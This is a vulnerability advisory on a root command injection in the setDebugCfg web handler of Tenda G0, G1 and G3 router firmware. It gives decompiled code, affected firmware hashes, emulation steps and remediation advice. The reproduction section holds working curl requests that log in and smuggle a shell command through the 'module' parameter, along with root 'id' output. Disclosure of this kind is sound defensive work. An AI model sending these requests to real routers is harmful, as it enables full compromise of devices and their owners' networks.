# Tenda G0/G1/G3 setDebugCfg Authenticated Command Injection

## Vulnerability Summary

| Field | Value |
| --- | --- |
| VulnDB ID | Pending assignment |
| Vendor | Tenda |
| Product | G0, G1, and G3 AP management router family |
| Affected Firmware | `US_G0-POEV1.0RE_V15.11.0.69039_CN_TDC01`, `US_G0-PoEV1.0RE_V15.11.0.55876_TDC`, `US_G0V1.0RE_V15.11.0.55876_TDC`, `US_G1V1.0&G3V3.0br_V15.11.0.179502_CN_TDC`, `G3V3.0br_V15.11.0.20(10700)_CN_TDC` |
| Affected Component | `bin/httpd` GoAhead handler `/goform/setDebugCfg` |
| Vulnerability Type | OS command injection |
| CWE | CWE-78 |
| CVSS v3.1 | 8.8 High |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Discovery Source | FirmRec batches `tenda_new_all_closed_022_of_046` and `tenda_new_all_closed_023_of_046`, manually confirmed |

## Description

Tenda G0, G1, and G3 firmware exposes a GoAhead action named `setDebugCfg`. The handler reads HTTP parameters `enable`, `level`, and `module` with `websGetVar()`, formats them into a shell command, and executes the command with `system()`.

The `module` parameter is inserted into the shell redirection target without quoting or shell metacharacter filtering:

```c
uVar1 = websGetVar(param_1, "enable", ...);
uVar2 = websGetVar(param_1, "level", ...);
uVar3 = websGetVar(param_1, "module", "httpd");
sprintf(acStack_8c, "echo enable=%s level=%s > /var/debug/%s", uVar1, uVar2, uVar3);
system(acStack_8c);
```

An authenticated administrator, or a first-setup session that has just initialized the device, can inject shell metacharacters in `module` and execute commands as root.

## Affected Assets

Confirmed affected firmware images:

| Firmware archive | `bin/httpd` SHA-256 | Handler address |
| --- | --- | --- |
| `G0-PoE___30_PoE_AP___US_G0-POEV1.0RE_V15.11.0.69039_CN_TDC01.zip` | `c6e5c8d94a128ff719248187dfb764b9d34c6e131971bbac31a652d89369d4a4` | `0x45becc` |
| `G0-PoE___30_PoE_AP___US_G0-PoEV1.0RE_V15.11.0.55876_TDC.zip` | `564e03cb42b5bbc3d2a11b4995f5569514ca3a7433ead383557c243fd0f66053` | `0x45d354` |
| `G0___30_AP___US_G0V1.0RE_V15.11.0.55876_TDC.zip` | `564e03cb42b5bbc3d2a11b4995f5569514ca3a7433ead383557c243fd0f66053` | `0x45d354` |
| `G1___100_AP___US_G1V1.0_G3V3.0br_V15.11.0.179502_CN_TDC.zip` | `0958b264f2a1ce624aa05e682dfb469aa01aa3c4b4d5926dd28ff1cff4542a60` | `0x3eb98` |
| `G3___200_AP___G3V3_V1511020.zip` | `1a562cc683e494387ce65d8b27a5c1b22819a55ee8a77e597fe2dadaf655800f` | `0x40394` |

## Steps to Reproduce

The following steps reproduce the issue against the emulated firmware service and avoid relying on external summary attachments.

1. Extract the firmware root filesystem and run the MIPS big-endian `httpd` service on a local test port:

```bash
qemu-mips-static -L ./rootfs ./rootfs/bin/httpd ./rootfs/webroot_ro 127.0.0.1:18080
```

2. Initialize the first-setup password, matching the product web UI JSON request. `YWRtaW4xMjM=` is base64 for `admin123`.

```bash
curl -c cookies.txt -b cookies.txt \
  -H 'Content-Type: application/json' \
  --data-binary '{"setQuickCfgWifiAndLogin":{"wifiSSID":"FirmRec","wifiPassword":"FirmRec123","sysPassword":"YWRtaW4xMjM=","wifiSecurity":"psk2","bLanguage":"en"}}' \
  'http://127.0.0.1:18080/goform/module'
```

3. Authenticate with the configured password.

```bash
curl -c cookies.txt -b cookies.txt \
  -H 'Content-Type: application/json' \
  --data-binary '{"auth":{"password":"YWRtaW4xMjM="}}' \
  'http://127.0.0.1:18080/goform/module'
```

4. Send the vulnerable request. The injected `id` command writes a root-execution sentinel.

```bash
curl -c cookies.txt -b cookies.txt \
  'http://127.0.0.1:18080/goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G0_DEBUGCFG_PWN%3B%23'
```

5. Observe the HTTP response and created sentinel:

```text
HTTP response body:
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G0_DEBUGCFG_PWN;#

/tmp/TENDA_G0_DEBUGCFG_PWN:
uid=0(root) gid=0(root) groups=0(root)
```

The same procedure was repeated successfully on `US_G0-PoEV1.0RE_V15.11.0.55876_TDC` using port `18081` and sentinel `/tmp/TENDA_G0_55876_DEBUGCFG_PWN`, and on non-PoE `US_G0V1.0RE_V15.11.0.55876_TDC` using port `18100` and sentinel `/tmp/TENDA_G0_NONPOE_DEBUGCFG_PWN`.

For the ARM G1/G3 images, the product web UI uses a form-encoded first-login flow. The same vulnerable endpoint was reproduced after initializing the administrator password with `/goform/initAdminUser` and authenticating through `/login/Auth`:

```bash
qemu-arm-static -L ./rootfs ./rootfs/bin/httpd ./rootfs/webroot_ro 127.0.0.1:18201

curl -c cookies.txt -b cookies.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'sysUserPwd=YWRtaW4xMjM=' \
  'http://127.0.0.1:18201/goform/initAdminUser'

curl -c cookies.txt -b cookies.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'password=YWRtaW4xMjM=' \
  'http://127.0.0.1:18201/login/Auth'

curl -c cookies.txt -b cookies.txt \
  'http://127.0.0.1:18201/goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G1_179502_DEBUGCFG_RECHECK%3B%23'
```

The same ARM flow created root `id` sentinels on `US_G1V1.0&G3V3.0br_V15.11.0.179502_CN_TDC` and `G3V3.0br_V15.11.0.20(10700)_CN_TDC`.

## Impact

Successful exploitation allows an authenticated administrator to execute arbitrary shell commands as root on the router. This can lead to full device compromise, persistent configuration modification, traffic interception, and denial of service.

## Evidence

Local evidence files retained with this report:

```text
inout/reports/tenda_new_all_manual/g0_debugcfg_69039_callers.jsonl
inout/reports/tenda_new_all_manual/g0_debugcfg_55876_callers.jsonl
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_debug_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_sentinel.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_debug_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_sentinel.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_debug_body.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_sentinel.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g1_179502_debug_cookie_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g1_179502_sentinel.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g3_1511020_debug_cookie_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g3_1511020_sentinel.txt
```

## Remediation

Do not build shell commands with raw HTTP parameters. Replace `system()` with direct file I/O for debug configuration, validate `module` against an allowlist of known module names, and reject shell metacharacters such as `;`, `&`, `|`, `` ` ``, `$`, `>`, `<`, and newline characters.
